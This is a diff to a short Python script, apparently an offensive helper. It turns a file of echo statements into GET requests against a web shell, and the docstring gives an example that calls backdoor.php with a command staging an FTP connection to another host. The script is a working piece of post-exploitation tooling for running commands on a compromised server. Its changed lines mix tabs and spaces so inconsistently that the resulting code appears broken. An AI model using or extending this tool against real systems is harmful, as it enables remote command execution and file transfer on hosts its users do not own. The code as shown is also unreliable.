@@ -5,12 +5,11 @@ import requests
 '''
 	$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 	This program is utilized to convert a text file with
-	echo statements utilized in exploitation from a 
-	non-interactive shell. The output is converted into
-	http string formats and sends the information via 
-	'GET' method. 
+	echo statements into a non-interactive shell. 
+	The output is converted into http string formats and 
+	sends the information via 'GET' method. 
 	Example output sent to remote server:
-	http://10.1.1.2/backdoor.php?cmd=echo open 10.1.1.1 21>ftp.txt
+	http://10.1.1.2/remote_exec.php?cmd=echo open 10.1.1.1 21>ftp.txt
 	$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ''' 
 #parse args from command line, else exit gracefully
@@ -37,7 +36,8 @@ def createlines(lines, kurl):
             r=requests.get(kurl, params=payload)
             httplines.append(r.url)
     return httplines
-	
+
+#read each line from a file	
 def readfilelines(transfer):
 	lines = []
 	with open(transfer) as f:
@@ -46,17 +46,17 @@ def readfilelines(transfer):
             lines.append(content)
 	return lines
 
-	#write data to file
+#write data to file
 def writefile(filename, lines):
     for line in lines:
         with open(filename, 'a') as f:
-			line += '\r\n'
-            f.write(line)
+		line += '\r\n'
+        	f.write(line)
            
 def main():
-    transfer, outfile, url = getargs()
-    lines = readfilelines(transfer)
-    httpstuff=createlines(lines, url)
+	transfer, outfile, url = getargs()
+	lines = readfilelines(transfer)
+	httpstuff=createlines(lines, url)
 	writefile(outfile, httpstuff)
 
 if __name__ == "__main__":
